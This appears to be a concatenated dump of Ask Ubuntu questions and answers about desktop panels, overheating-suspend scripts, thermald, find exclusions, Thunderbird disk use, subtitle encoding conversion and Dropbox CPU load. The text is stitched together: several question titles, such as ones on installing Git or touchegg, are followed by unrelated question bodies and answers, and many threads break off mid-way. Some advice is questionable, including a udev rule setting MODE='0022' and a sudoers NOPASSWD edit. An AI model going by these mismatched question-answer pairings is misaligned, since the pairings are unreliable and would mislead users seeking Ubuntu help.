I use Ubuntu 12.10\nThanks.\n\nA: I don't think you can add icons like you used to in Gnome 2.\nAn icon ends up there if it's a notification.\nYou can add icons to the Unity's dock (on the left), by right clicking on an open application's icon, and selecting \"lock to launcher\"\nThis link might be helpful:\nWhat Application Indicators are available?\n\nA: Unity is not Gnome and the top bar is not a gnome-panel. As far as I know there is no way to add applications there. It is only made for indicators. Applications can only be docked to the launcher on the left side (right click->Lock to Launcher).\nIf you don't like Unity you have some alternatives to get the Gnome2 look again. There is the MATE desktop which continues the development of the old Gnome2. I think the better choice is Cinnamon which is a Gnome3 fork. It aims to basically look like Gnome2 but with some of the benefits the new Gnome3 offers.\nIn my experience, sadly both don't work to well with Ubuntu. I would recommend Linux Mint, which is based on Ubuntu and comes in editions with MATE and Cinnamon.\n", "Q: Build Ubuntu removing the unnecessary applications There are many apps in ubuntu like vino, vinagre etc that sit idle on my PC and have no use. Removing these apps does not remove the dependencies and hence take up space. This space is costlier when I have to run the system live for recovery or some other works. Installing apps over the LiveRUN takes up space in RAM Drive. Hence I want to start from the kernel and build up ubuntu (for every LTS version) that will have all the features of the OS but will remove the apps I never need to use along with their dependencies, Hence providing me a light distro customized for me entirely.\nI have previously heard of MinimalCD for Ubuntu but have never used. Is that what is to be used for this kind of a project?\n\nA: \nRemoving these apps does not remove the dependencies and hence take up space. \n\nBy running apt-get purge <packagename> you remove a package including is configuration files and following this by a apt-get autoremove will completely remove all unused dependencies of your system. \nWhile you might have some fun in building your own distro, it will definitely be more work than simply removing the dependencies you don't need. \nYou have to ask yourself, if your final system will be closer to a linux kernel (then start from there and add the software you need, lots of work), or if your final system is closer to Ubuntu (then start from there and remove packages + dependencies). \n", "Q: Eclipse Juno (4.2.1) crashes frequently after upgrading to Ubuntu12.10 from 12.04 (both 64bits)?

Essentially it does the same thing that OP's updated script does, except it forces to suspend despite inhibitors with -i flag. There are multiple considerations and improvements that can be done to the script, but as for right now this version does 90% of the job.\nI tested it briefly on 16.04 LTS, works perfectly fine. In future I might rewrite this in Python just because I can or upon user request. \nScript  Source\n#!/usr/bin/env bash\n\nsuspend_system(){\n\n    os_version=$(awk -F'[\"=]' '/VERSION_ID/{print substr($3,1,2)}' /etc/os-release)\n    if [ $os_version -ge 15   ]\n    then\n        systemctl suspend -i\n        # Alternative way is to call login manager method via dbus\n        # qdbus --system org.freedesktop.login1 /org/freedesktop/login1 \\\n        #       org.freedesktop.login1.Manager.Suspend True \n\n    else\n        dbus-send --system --print-reply --dest=\"org.freedesktop.UPower\"\\\n                  /org/freedesktop/UPower org.freedesktop.UPower.Suspend\n    fi\n\n}\n\nis_critical_temp(){\n    local temp=$(sensors | awk '/temp1/ {print substr($2,2,2)}')\n    if [ $temp -gt 75  ]\n    then\n        return 0\n    else\n        return 1\n    fi\n}\n\nmain(){\n\n    while true\n    do\n        if is_critical_temp\n        then\n           # optional dialog if running from GUI, not necessary if running form /etc/rc.local\n           #zenity --info --text \"Reached critical temperature. Suspending in 10 seconds\" &\n           sleep 10\n           suspend_system\n        fi\n    sleep 3\n    done\n}\nmain \"$@\"\n\nAlternative approach\nA while back, I found pm-suspend utility, from pm-utils package. This program works regardless of the OS version. The small disadvantage is that it requires root access, but it is easy to get around of that inconvenience.\nWhat I personally would do is the following:\n\n\n*\n\n*sudo apt-get install pm-utils\n\n*sudo visudo and add yourusername ALL = NOPASSWD: /usr/sbin/pm-suspend at the end of the file.\n\n*edit your script to call sudo pm-suspend instead of the dbus command.\n\n\nSuspending an Ubuntu machine in general\nYou've requested that answers draw upon credible sources. In fact, Ask Ubuntu does have canonical post about suspending from command-line: How can I suspend/hibernate from command line? Depending on the approach and level of permissions you want your script to have, there's multiple ways to skin a cat there. Some work better than others. In my answer I provided the dbus and systemctl approach, since those work with screen-locking as well. If you write to /sys/class/power/state, it won't lock the screen, although it is possible to get around that with some scripting magic. For now, I think, the better approach is to simply determine the OS version and select appropriate method as in my script, or use pm-suspend alternative.\n\nA: On my system every time sensors is run there is a stutter in video streaming. Having this happen every 10 seconds or however often proposed script is run would drive me bat crazy. A better solution to suspend would be using Intel's thermald and Powerclamp to slow down the CPU in order to reduce heat. I've written this answer for another question (Stop cpu from overheating) and am copying here for convenience.\nAdditionally the above script relies on temp1 which is often corrupted on my Ubuntu 16.04 and only temp3 is 100% reliable which doesn't show up on sensors. ie:\n$ cat /sys/class/thermal/thermal_zone*/temp\n27800\n29800\n58000\n\nand from sensors:\nacpitz-virtual-0\nAdapter: Virtual device\ntemp1:        +27.8°C  (crit = +106.0°C)\ntemp2:        +29.8°C  (crit = +106.0°C)\n\nThis happens after suspend/resume. The REAL temperature is +58.0°C but is falsely reported as +27.8°C after resuming. So the heat protection would only work once to suspend and never work again until a reboot. So the system would hit critical (+106.0°C) at which point a hard power off is performed and data can be corrupted.\nSo here's my recommended solution to prevent overheating and utilizing CPU slow down rather than outright system suspend.\nSlow down CPU to reduce heat\nThis works for Ubuntu 16.04+ with Intel Sandy Bridge and newer processors. \nFrom (wiki.debian.org -thermald) is Debian's (used by Ubuntu) write up about thermald, a Linux daemon for cooling tablets and laptops.  Once the system temperature reaches a certain threshold, the Linux daemon activates various cooling methods to cool the system.\nLinux thermal daemon (thermald) monitors and controls temperature in laptops, tablets PC with the latest Intel sandy bridge and latest Intel CPU releases. Once the system temperature reaches a certain threshold, the Linux daemon activates various cooling methods to try to cool the system.\nIt operates in two modes:\nZero Configuration Mode\n\n\n*\n\n*For most users, this should be enough to bring the CPU temperature of the system under control. This uses DTS temperature sensor and uses Intel P state driver, Power clamp driver, Running Average Power Limit control and cpufreq as cooling methods.\n\n\nUser defined configuration mode\n\n\n*\n\n*This allows ACPI style configuration in a thermal XML configuration file. This can be used to fix the buggy ACPI configuration or fine tune by adding more sensors and cooling devices. This is a first step in implementing a close loop thermal control in user mode and can be enhanced based on community feedback and suggestions.\n\n\nHow to install\napt-get install thermald\n\n\nIntel Powerclamp\nIntel's Powerclamp driver is defined here (kernel.org - Intel Power Clamp.txt) and is part of thermald described above. A direct quote for Powerclamp from the link:\n\nConsider the situation where a system’s power consumption must be\n  reduced at runtime, due to power budget, thermal constraint, or noise\n  level, and where active cooling is not preferred. Software managed\n  passive power reduction must be performed to prevent the hardware\n  actions that are designed for catastrophic scenarios.\nCurrently, P-states, T-states (clock modulation), and CPU offlining\n  are used for CPU throttling.\nOn Intel CPUs, C-states provide effective power reduction, but so far\n  they’re only used opportunistically, based on workload. With the\n  development of intel_powerclamp driver, the method of synchronizing\n  idle injection across all online CPU threads was introduced. The goal\n  is to achieve forced and controllable C-state residency.\nTest/Analysis has been made in the areas of power, performance,\n  scalability, and user experience. In many cases, clear advantage is\n  shown over taking the CPU offline or modulating the CPU clock.\n\n\nHow do you know Powerclamp is running?\nPowerclamp might only show itself once a year when your fan vents get too much dust & lint. So how do you know it's actually running in the background? Use:\nlsmod | grep intel\n\nAnd you should see a list similar to this:\nbtintel                16384  1 btusb\nbluetooth             520192  29 bnep,btbcm,btrtl,btusb,rfcomm,btintel\nintel_rapl             20480  0\nintel_powerclamp       16384  0\n   (.... more intel drivers ....)\nsnd                    81920  18 snd_hwdep,snd_timer,snd_hda_codec_hdmi,snd_hda_codec_idt,snd_pcm,snd_seq,snd_rawmidi,snd_hda_codec_generic,snd_hda_codec,snd_hda_intel,snd_seq_device\n\nIf you see intel_rapl and intel_powerclamp you know it's working and simply waiting temps to exceed 85C.\n\nPowerclamp in action displayed by Conky\nHere is a screen shot when Powerclamp injects sleep cycles:\n\nNormally on this system CPU clock speed is 2400 Mhz to 3400 Mhz when watching HTML5 video and 10 Chrome tabs open. Normally CPU utilization is about 9% to 12% across 8 CPUs. When things get too hot (86C) Powerclamp kicks in and this happens:\n\n\n*\n\n*CPU speed is reduced to 1200 Mhz. \n\n*CPU utilization spikes up to 80%. This is misleading because the extra 70% is sleeping time.\n\n*The top 9 CPU processes are usually 5 or 6 Chrome processes plus Xorg, Conky, Pulse Audio and an occasional kworker. However now 8 of the top 10 are the kidle_inject/x process where x is from 0 to 7. For the first 8 CPUs.\n\n\nThe Powerclamp driver runs until temps drop below 85C again. While the driver is running you might have split second pausing in your videos and possibly split second keyboard and mouse lag.\n\nDisable Intel Turbo Boost\nBack in the \"cool old days\" of Ubuntu 14.04 Intel Turbo Boost was broken so my processor speed fluctuated between 1200 Mhz and 2400 Mhz. After upgrade to Ubuntu 16.04 it would go up to 3400 Mhz (3.4 Ghz) because Turbo Boost was finally working. But it also raised the heat.\nTo disable Intel Turbo Boost use:\necho \"1\" | sudo tee /sys/devices/system/cpu/intel_pstate/no_turbo\n\n\nA: I managed to make my own script. \n#!/bin/bash\nwhile true; do\n   val=$(sensors | awk '/temp1/ {print $2}')\n   max=\"+75.0\"\n   if [[ \"$val\" > \"$max\" ]]; then\n       dbus-send --system --print-reply --dest=\"org.freedesktop.UPower\" /org/freedesktop/UPower org.freedesktop.UPower.Suspend\n   fi\n   sleep 10\n   clear\n   sensors\ndone\nexit 0\n\nFor 16.04 (also here):\n#!/bin/bash\nwhile true; do\n   val=$(sensors | awk '/temp1/ {print $2}')\n   max=\"+75.0\"\n   if [[ \"$val\" > \"$max\" ]]; then\n       systemctl suspend\n   fi\n   sleep 10\n   clear\n   sensors\ndone\nexit 0\n\n\nA: I have radically edited the above question in order to ask for updates for 16.04 and my answer below is therefore only an update to the the initial answer by Kenn, on which I posted a duplicate question and is also an answer under that. \nAs the error in 16.04 was Error org.freedesktop.DBus.Error.UnknownMethod: No such method 'Suspend', after the comment made by Nick Sillito under my duplicate question linking to this answer, I have modified the script by replacing this entire part:\n    dbus-send --system --print-reply --dest=\"org.freedesktop.UPower\" /org/freedesktop/UPower org.freedesktop.UPower.Suspend\n\nwith \n    systemctl suspend\n\nAs indicated in the comment made by wjandreea under the duplicate question: sleep 10 or a similar value shouldn't be removed (as I initially did); without that line, the modified script will use more power because instead of running every 10 seconds, it will as fast as possible -- upwards of several dozen times per second.\nAt this point the system goes to sleep when going above the level set in the line\nmax=\"+75.0\"\n\n\nAs I want a higher value, 82, the script I use is:\n#!/bin/bash\n\nwhile true; do\n   val=$(sensors | awk '/temp1/ {print $2}')\n   max=\"+82.0\"\n   if [[ \"$val\" > \"$max\" ]]; then\n                        systemctl suspend\n\n   fi\n   sleep 10\n   clear\n   sensors\ndone\nexit 0\n\n", "Q: Unable to run internet in Ubuntu 12.10 I have MTS MBlaze working fine till Ubuntu 12.04.But now I have installed Ubuntu 12.10 on the same desktop, but it doesn't workWhy?\n\nA: Ping 8.8.8.8 \n\nIf this ping is successfull, then check /etc/resolv.conf if this contains 127.0.0.1 please use following code to fix this partially as you need to run this code every time you change network.\ncat /etc/resolv.conf\nnameserver 127.0.0.1\nsudo dhclient $connectionname #mobileBroadband in your case \n\nThis will set you DNS Server to what you ISP provides, Alternatively you can try \nvi /etc/resolv.conf \nnameserver 8.8.8.8\nnameserver 8.8.4.4\n\nand edit the above file with Google public DNS (8.8.8.8) or Open DNS(208.67.222.222)\nand check again.\n", "Q: how to reset dual display to one screen from command line?

For whatever reason it now works on a fresh build, and with all the same hardware and software that was on before. I don't know why the in-place upgrade from 12.04 to 12.10 causes failure but a clean install of 12.10 doesn't but I hope this helps someone out at least a little. Unfortunately I get to spend today rebuilding my web server from scratch.\nGood luck!\n\nA: I still have the same issue as yourself. Everything was working fine until I upgraded to 12.10. I've followed so many tutorials on how to delete video drivers, reinstall ubuntu-desktop and unity, completely purge fglrx, etc., and all to no avail. From what I understand we need to wait for ATI to make a driver that is compatible with 12.10. So I guess we wait.\n\nA: Some \"old\" ATI cards are no more supported and their drivers are not updated, so an older version of Xorg. You shouldn't be affected, as your card is newer, but you may be.\nSo, I had the same problem with you and this worked for me... http://www.ubuntuvibes.com/2012/10/how-to-install-amd-catalyst-legacy.html\n", "Q: How to install Git on Ubuntu?

Alright, so on an external hard drive, I plan to make multiple Ubuntu installations. As some computers do not mesh well with trying to use a different hierarchy as far as I can understand, how can I make a bootloader on the said external hard drive to support being able to choose between 64-bit and 32-bit?\nHere's the partitioning game plan I have drawn out:\nNot-bootable: FAT32 - 830GB \"ObsidianWin\"\nBootable: ext4 - 50GB \"Obsidian32\"\nBootable: ext4 - 50GB \"Obsidian64\"\nSwap space: swap - 2GB  \nTotal usable space: 932GB\nIf there needs to be another partition for the bootloader, then the FAT32 can get shrinked - I really don't mind/care, since the ObsidianWin partition is basically for storage.\n\nA: *\n\n*The Ubuntu bootloader (GRUB2) can boot any OS, 32 and 64bit. For example, if you install Ubuntu12.04 32bit and Ubuntu12.10 64bit or your disk, the GRUB menu will let you choose to boot \"Ubuntu12.04\" or \"Ubuntu12.10\".\n\n*If your computer is 32bit, you can't install any 64bit system on it\n\n*If your computer is 64bit, you can install 32bit systems and 64bit systems, but 64bit systems will manage better your hardware.\n\n", "Q: How do I change the default permissions for automounted USB media? tl;dr:\nHow do I make gnome automount USB devices with permissions so that everyone in the group can access them instead of just one user that is logged in at the time the USB storage is plugged in?\n\n(Here the group is called confus and the users narur and confus are both in that group. Only narur was logged in, at time of USB plug in so only narur can access the USB device - even after a sudo chmod g+rw. How do I change that?)\n\n\nDetails:\nI run a media server at my home. It is connected to a projector as only monitor. Form time to time I like to plug in a USB drive to copy stuff from the server to said drive. The drive gets auto-mounted by the usual gnome shenanigans. Obviously I don't want to turn on the projector (take a while and is not good on the lamp). So I login to the server over ssh and do the copy over terminal from another PC.\nProblem is, the USB drive gets mounted under a different user than the user I log in as via ssh. My ssh user doesn't have the rights to open the mount point chosen by gnome although it is in the same group. For clarification see this terminal session:\nconfus@conserve:/media$ id\nuid=1000(confus) gid=1000(confus) groups=4(adm),8(mail),20(dialout),24(cdrom),46(plugdev),113(lpadmin),114(sambashare),122(admin),126(debian-transmission),135(debian-tor),1000(confus)\n\nconfus@conserve:/media$ ll\ntotal 28\nlrwxrwxrwx  1 root   root      6 Mar  8  2009 cdrom -> cdrom0\ndrwx------  1 narur  confus 4096 Oct  8 16:53 contemplate     # <-- USB drive\ndrwxr-xr-x  2 root   root   4096 May  3  2010 iso\ndrwxr-xr-x  2 confus confus 4096 Dec  8  2009 usb1\n\nconfus@conserve:/media$ sudo chmod -R ug+rwX 4009-D44F/       # <-- Doesn't do anything\n[sudo] password for confus: \n\nconfus@conserve:/media$ ll\ntotal 28\nlrwxrwxrwx  1 root   root      6 Mar  8  2009 cdrom -> cdrom0\ndrwx------  1 narur  confus 4096 Oct  8 16:53 contemplate    # <-- No change after chmod\ndrwxr-xr-x  2 root   root   4096 May  3  2010 iso\ndrwxr-xr-x  2 confus confus 4096 Dec  8  2009 usb1\n\nMy ssh user is \"confus\" while the disk is mounted for the user \"narur\". Obviously a simple chmod doesn't do since its a mount point. The problem exists for every USB storage device.\nI know I could write a udev rule and I know that device based solutions exists. But there should be an easier solution to this problem, that's native to gvfs.\nUpdate:\n\n*\n\n*Related post on superuser\n\n*Related launchpad bug\n\n*Another related launchpad bug.\n\nNothing has changed since 2009. This is embarrassing. There should be an easy work around for this problem at least.\n\nA: I guess your USB drive is formatted with VFAT/FAT32. This file format does not support execute permissions which is why chmod +x fails.\n[Edit] Ok, had a bit of a play and search on the net. Lots of 'solutions' suggest that you should change /etc/fstab. This just seems clunky to me, what do you do? change fstab every time you encounter a new USB flash drive???\nMy solution:\n$ sudo vi /etc/udev/rules.d/90-usb-disks.rules\n\nAdd the lines:\n# UDEV Rules to change the permission of USB disks\n\n#\n\nKERNEL==\"sd*[0-9]\", ATTR{removable}==\"1\", ENV{ID_BUS}==\"usb\", MODE=\"0022\"\n\n$ sudo /etc/init.d/udev restart\n\nThen try inserting a usb drive. There is probably an attribute that you can check for to ensure it's a FAT formatted drive if you wanted to be more specific.\n", "Q: Dual graphic (between graphic card and mainboard graphic) Can I do the dual graphic (use two same monitor, the monitor 1 is next to monitor 2, monitor 1 use the graphic card, monitor 2 the mainboard graphic) on Ubuntu? What driver I should install to do the dual graphic?\n\nMainboard graphic: HD2500 (from Intel Core i5-3450)\n  Graphic card: ATi Radeon HD 4850\n\n\nA: At least in my case, no you can't.  \nFirst, using multiple different vendor graphics cards, while theoretically possible, is riddled with problems.\nThis part has been asked before, but I can't seem to put my hands on the question \nSecond, most of the time on-board graphics is disabled when the motherboard detects a secondary video card inserted.  \nThird, even if it were possible you would run in to similar issues to what vga_switcheroo, bumblebee, and ironhide all try to address.  \nWhile they are a little different since they address hybrid graphics cards, I would imagine there would be similar problems.\n", "Q: How to install touchegg?

So, everytime I open a new tab (about:newtab) or just a white screen (about:blank).\nIt would be better, Firefox displays my desktop instead (or what's 'behind' firefox) to work more efficient.\nI thought to try Firefox's Add-On 'Stylish' to solve this problem, but those scripts are only for Windows with Aero support.\nSo... any other ideas how I get a transparent page/screen in Firefox?\nEDIT To clear things up: I don't want the whole window transparent!\n\nA: You can do it with using  compiz. Install the compizconfig settings manager \nby following command in terminal.\n\nsudo apt-get install compizconfig-settings-manager\n\nGo to accessibility enable \"opacity,brightness and saturation\". Click on this icon. Click on the new button at \"Windows specific settings\". Click on the + button and enter \"Firefox\" in the value field. Press add... Use slide to influence transparency. 100=no transparancy - 0=100% transparency.\nNow you can see the background through firefox. \n", "Q: Subwoofer problem in HP Envy I bought a HP ENVY 6-1060ss, it has 2 front speakers and a built-in subwoofer.

Is there a fix for this? I can't find much information on Google.\n\nA: Githlar's answer removes the warning, without responding to what the warning is telling you. It's actually saying that loading from ~/.fonts.conf will be removed in the future. Hence, Githlar's solution will ignore what will break in the future. The correct thing to do is to move ~/.fonts.conf to ~/.config/fontconfig/fonts.conf .

How'd I go about doing that?\nThanks!\n\nA: find / -path ./test -prune -o ...\n\nRename ./test to fit the location of you test directory.\n\nA: You can use the -path option to find and combine it with the -not operator. \nfind . ! -path \"*/test/*\" -type f -name \"*.js\" ! -name \"*-min-*\" ! -name \"*console*\"\n\nPlease note two things\n\n\n*\n\n*-path must come as the first argument\n\n*the pattern matches the whole filename, so -path test will not match anything, ever\n\n\nBy the way, I'm not sure why you are using parentheses, it doesn't make a difference. It is only used for precedence, for constructs such as ! \\( -name '*bla*' -name '*foo*' \\) (that is, do not find things that have both bla and foo).\nA further refinement: no need to use the bash loop, you can simply do\nfind . ... -exec cat {} \\; -exec echo \\;\n\nwhere ... are the other arguments to find.\n\nA: To expand on what I think @CharlesClavadetscher was going for with his answer. If you omit a path with -not -path ... find will continue descending the path.  Instead, using -prune will stop it from descending further into the omitted path, making it faster. So you can do something like\nfind . -path '*test/*' -prune -o -type f -name \"*.js\" ! -name \"*-min*\" ! -name \"*console*\" -print\n\n\nA: You can try with grep like this (the folder here is named test_folder):\nfind . -type f \\( -name \"*.js\" ! -name \"*-min*\" ! -name \"*console*\" \\) | grep -v \"/path/to/test_folder/\" | while read line\n\nor if your find returns relative path :\nfind . -type f \\( -name \"*.js\" ! -name \"*-min*\" ! -name \"*console*\" \\) | grep -v \"./relative_path/to/test_folder/\" | while read line\n\nor if you want all folders that has the same name but with different path\nfind . -type f \\( -name \"*.js\" ! -name \"*-min*\" ! -name \"*console*\" \\) | grep -v \"/test_folder/\" | while read line\n\nBest regards,\n\nA: I use \"not wholename\" when I'm just searching for a file.  -name tests the actual filename, but -wholename tests the full path.\nSo adding an ignore for test to the question above:\nfind . -type f \\( -name \"*.js\" ! -name \"*-min*\" ! -name \"*console*\" \\) ! -wholename \"*test*\"\n\n", "Q: Thunderbird 16.0.1 filling disk space I'm on Ubuntu 12.04 with Thunderbird 16.0.1 and Kernel 3.6.0-030600rc4-generic. I used Thunderbird for quite a while and never had any problems with it. But now it seems to fill up my disk space very fast: \nwatch -n 1 df -h .\n\nso Ubuntu started giving out warnings. First I removed some files but not much later it had filled up around 600 MB. It eats around 50 MB/min while I just download 10 emails or so via IMAP. This behaviour is new and seems to be some kind of bug. I don't want to delete my old mails, so what else could I do?\n\nA: Your issue is certainly related to a regression introduced in TB16 and which impact some IMAP servers (like dovecot).\nBug 803843 - IMAP mailfiles keep growing to gigabyte size\n\nA: Have you tried this : http://kb.mozillazine.org/Compacting_folders\nBecause this article is for old Thunderbird versions, you will find the option here: Edit / Preferences / Advanced / Network & Disk Space. Also it is turned ON by default with this setting: Compact all folders when it will save over 20 MB in total.\nIf not give it a try. What I think that you are victim is that thunderbird may have a little bug that doesn't clean well his folder.\nIMAP is quite complex and what is happening is that your e-mails are on the server but downloaded to your mail client. \nIf it's on his default settings then thunderbirds must delete what has been deleted from the server. that part may have some trouble.\nBest regards,\n\nA: I had exactly the same problem. I made some space in my home and thunderbird ate it all. Compacting was not possible (\"No space left on device\" it kept saying). My \"ImapMail\" folder had more than 20GB!\nI found out that in one of my email account imap folders were files INBOX (7.3GB) and Sent (8.6GB). I closed Thunderbird and then moved those two files to my external hard drive (as backup). After openning Thunderbird again it created new files, which had been moved, and now they have only few kilobytes. I haven't lost any emails and everything works as before.\n\nA: The fix that worked for me for IMAP related problems:\nBackup your profile folder using something like MozBackup.\n    Start Thunderbird.\n    Move all of the messages in the Inbox to other folders/child folders. You can select all of the messages using Control-A. If you have problems moving all of the messages, do it in multiple steps, where you select only a few messages each time.\n    Verify that all of the messages have been moved.\n    Exit Thunderbird and Go to your 'Home' folder hit ctrl+H to un-hide the hidden files, go to path '/home/user_name/.thunderbird/4kh5v6hf.default/ImapMail'. \nNow,delete BOTH the \"inbox.\" and \"inbox.msf\" files for that account. Leave \"Inbox.sbd\" alone. You can find where the Inbox folder is stored by looking at Tools -> Account Settings -> Server Settings -> Local Directory, or Tools -> Account Settings -> Local Folders -> Local Directory if you are using a Global Inbox. Its at the bottom of that pane, next to a Browse button.\n    Start Thunderbird. It will automatically create a new Inbox folder. \nWhile it's possible to move the messages back to the (new) Inbox, it's recommended you don't do that. \n", "Q: Boot screen appears to be asking a question but garbled \nPossible Duplicate:\nUbuntu 12.04 NVIDIA GeForce Go 7600 black screen during boot \n\nI'm running 12.04 Precise Pangolin, Kernel 3.2.0-32 w/ GNOME 3.4.2\nI perused the prior questions/answers and did not find exactly the same problem,  I am concerned that AUTOFSCK, Grub or some other critical event that needs some attention ?\nAny idea on how to get my video clean during boot?

I checked - if path started with / it works, but if root folder mounted as disk, winebrowser doesn't recognize this path and does nothing. \n\nA: It may be quite disturbing and I might be wrong but the behavior that you describe was maybe a bug of Wine (which may took a long time to be corrected).\nLet me explain why :\nWine is a layer to Linux that helps windows programs to run under Linux.

I bought a newer Toshiba Satellite with an i7 CPU, 8GB Ram, 1TB HD, first thing I tried to do was install Ubuntu 9 on it then I found out it was no longer Supported. (I gave my 10.04 disk away)\nSo I tried installing Windows 7 and experienced SO MANY problems, I am going back to try 12.04. Starting all over again.\nAfter installing 12.04 Wireless was Detected yet said it was Disabled by a Hardware Switch.\nWent read through the Message Boards found Solution which was Sudo rf Kill All.\nOkay all excited I would finally get my Ubuntu to finally work I rushed back to my laptop from the internet cafe, and went looking for the TERMINAL input on my Ubuntu 12.04, and I cannot find the Terminal. If I can't find the TERMINAL how Can I enter any Sudo Stuff?\nSo I guess the first question is Where is the Terminal Located in 12.04?\nThank you.\n\nA: Open the main menu of Unity (should be the top most icon in the Unity bar - you can also press the windows key on your keyboard) and type the name of whatever program you want to run, in your case \"terminal\". Unity should search all installed programs and present you with the results. If the Unity bar is not shown, you probably have graphics driver issues - try installing the binary drivers for your graphics hardware - check the numerous guides on how to do this without a graphical interface.\nAnother way to open a terminal emulator is the keyboard shortcut which should be Ctrl+Alt+T. \nIf all that fails you can get one out of 6 non-graphical terminals by pressing Ctrl+Alt+[F1-F6]. pressing Ctrl+Alt+F7 should bring you back to the graphical user interface.\n\nA: You can open a terminal by pressing Ctrl + Alt + T \nTo unblock wireless you need: rfkill unblock all. No need to add sudo.\nYou may also type this by opening the Alt + F2 command entry dialog.\n\nA: Click the most upper left icon (Dash Home, Ubuntu Logo) and type the word\nTerminal\nHope this helps.\n", "Q: Virtual Hosts Not Working (12.10) I'm trying to get virtual hosts up and running on my Ubuntu laptop that has 12.10 installed.

They are encoded as Western(ISO-8859-15) and therefore some characters are not displayed correctly. I am tired of replacing manually using gedit and ctrl-h and then saving as UTF-8. How to automate this process?\n\nA: You can use iconv:\nIf the file is named chapter1.srt, then run:\niconv -f iso88591 -t utf8 chapter1.srt > outputfile.srt\n\nand it will create the file, although it'll have a different name. If you move them out into another directory, then you can easily pipe them back in.\n\nA: Another option is\nkonwert \nkonwert isolatin1-utf8 inputfile.srt > outputfile.srt\n\nBesides conversion, konwert can also be used as an encoding detector:\nkonwert any/en-test inputfile.srt\n\nWhich is great to get the input file encoding needed for the conversion, since both konwert and iconv requires that as argument. You must however provide a language parameter: en in any/en-test means English\nIt also has an option for in-place conversion, so you don't have to move and rename files afterwards:\nkonwert isolatin1-utf8 -O inputfile.srt\n\n\nA: Also, since you're dealing with .srt files, you should really check pysrt.

I am literally tired for this fiddle-work for half of the day and have completed just 2 sheets, hmmm.\n\nA: LaTex is the standard document markup language for scientific papers. It's pretty hard to get in to for beginners, but very much worth the effort. Given your time constraints I would advise you to do the following:\nUse a combination of TexMaths (for LaTex integration into LibreOffice) and a LaTex GUI equation editor like Daum Equation Editor (requires Google Chrome / Chromium but works fine offline) to create your formulae.\n\nA: I am not aware of being able to do that in libre office.\nI would suggest you try using Latex though. There is a very comprehensive Introduction/Manual available at http://en.wikibooks.org/wiki/LaTeX. Once you get the hang of it, writing scientific papers, especially with a lot of symbols and math, is much faster than doing it in a 'conventional' text editor. It is not exactly what Tony Stark uses i guess, but much faster than scrolling through drop down menus for every little symbol.  \n\nA: As stated by other people answering, LaTeX is definitely the best option by far for future reports you're going to need but seeing your time frame I wouldn't recommend it. \n\n\n*\n\n*Otherwise an option in your case could be to re-keybind some keys you're not using while typing in Libre Office, I'd suggest to keybind the Fn keys to the different required shortcuts for the letters while you type up your work, and revert them back afterwards (I'm not a Libre Office user myself but I'd assume it should be possible). As a reminder to re-keybind or recreate your own shortcuts you go to:\n\n\n*\n\n*Sytem settings\n\n*Keyboard\n\n*Shortcuts\n\n*Custom Shortcuts\n\n\n*As a last resort there is the good old Ctrl+C followed by Alt+Tab and Ctrl+V by keeping two documents side by side as below with your most used letters, that way at least you won't have to open up the insert list each time and search through it, though I already acknowledge this is only a slight workaround until I can find out in detail how to make the previous option I suggested work.\n\nHope this helps and good luck with your report!\n\nA: Why don't you use the autocorrect option! It converts every (C) in all my figure caption to the copyright symbol. It can replace anything with anything you tell it to do so. You can make some rules such as replace %alpha with alpha symbol just like this:\n\nand voila!\n\nA: Latex is old & gone except or those who are in their 40s...Use Daum equation Editor (Chrome plugin), a small plugin for a trivial equation editing\n", "Q: No sound on ASUS 1225C notebook with pre-installed 12.04 LTS Sound works fine on first operation.

First I will just tell you how my wordpress hierarchy looks like:\n/var/www has all of the wordpress files, which is different from how it is normally set up as /var/www/wordpress (symlinked to /usr/share/wordpress). So var/www contains all of the files that /usr/share/wordpress would have, and /usr/share/wordpress is symlinked to /var/www, with an extra /var/www/wordpress symlinked to /var/www to prevent possible compatibility issues.\nWhen uploading a file like a favicon or a .zip-ped theme, everything works fine, and when checking if the theme/favicon is uploaded, wordpress shows that it is, and points to a directory that it thinks that it had created, like http:/localhost/wp-content/uploads/2012/..., which it had not, because the uploads folder is empty!\nAnd so there is a broken link on the internet and the theme is displayed but it has just plain text (because it had reverted to a plain theme I think)\nPlease help! I am sorry for such a long post but this is really quite a troublesome problem.\nI have chowned /var/www and /usr/share/wordpress to www-data.\n\nA: It looks like you need to tell Wordpress where to find its own directory. Check under Settings > General for \"WordPress Address\" and \"Site Address\". \nMake sure the WordPress Address matches the domain name you are using to represent your www folder; localhost in this case, or your domain name if you put your server online.\nTh other possibility is that you haven't given WordPress execute permissions on your /var/www folder. Check the owner of www, and make sure you allow WordPress to create files and folders.\n\nA: SOLVED - Install using the lates.tar.gz package straight from wordpress, rather than the apt-get ubuntu packaged one.\nIt is probrably due to incorrect permissions.\nhttp://www.youtube.com/watch?v=9Nk3770S4jk&noredirect=1\n", "Q: Stuck With grub rescue> console \nPossible Duplicate:\nGrub rescue - error: unknown filesystem \n\nHere is the background of my issue:\nI just recently installed the latest version of Ubuntu along side with Windows 8 Enterprise.

I recently noticed that Dropbox is taking about 50-90% of my CPU for more than just a few seconds sometimes - mostly when downloading/syncing many or large files.\nStill, I guess that even when syncing a lot of data, there's no reason to use that much CPU (perhaps network or disk..)\nAny ideas or suggestions? How can I make Dropbox use less CPU?\n(running on Ubuntu 12.04 on Lenovo X220 with SSD Drive)\n\nA: Dropbox computes a hash of all files that it's going to sync, it uses it both to determine if they changed and to avoid uploading content that is already in their cloud (another customer has the same file). \nCalculating hashes takes CPU power. It's usually noticeable at login.\n\nA: You can limit the cpu usage of any application this way:\n#nPidDropbox=`ps -A -o pid,comm |egrep \" dropbox$\" |sed -r \"s'^ *([[:digit:]]*) .*'\\1'\"`\nnPidDropbox=`pgrep dropbox`\n\nrenice -n 19 `ps -L -p $nPidDropbox -o lwp |tr \"\\n\" \" \"`\ncpulimit -p \"$nPidDropbox\" -l 10\n\nThe first line of code is just a pid guesser.\nThe 2nd line is to help cpulimiter work better while not requiring sudo.\n\nA: Perhaps there is more to it than the problem of hashing. \nOne thing that I find strange is that with lsof | grep dropbox I do not see many open files under ~/Dropbox for the dropbox process. \nWhat I did was to aptitude purge all packages related to dropbox, rm -r the 3 ~/.dropbo* folders (but not the ~/Dropbox folder), and then enable partner repositories and aptitude install nautilus-dropbox. Whether this procedure is problematic I do not know. \nAfter a while (an hour?) with the new install and with dropbox CPU load I no longer see the load, so apparently the problem is solved. Perhaps the purging has helped or I just had a very large batch of files that needed updating.\n\nA: Now, 2019. Dropbox is on version 79. Using it with Debian on a i7 7th gen, it still consumes ~ 15% Cpu when not uploading or downloading files.\nIn its download page, Dropbox says how to install in a headless 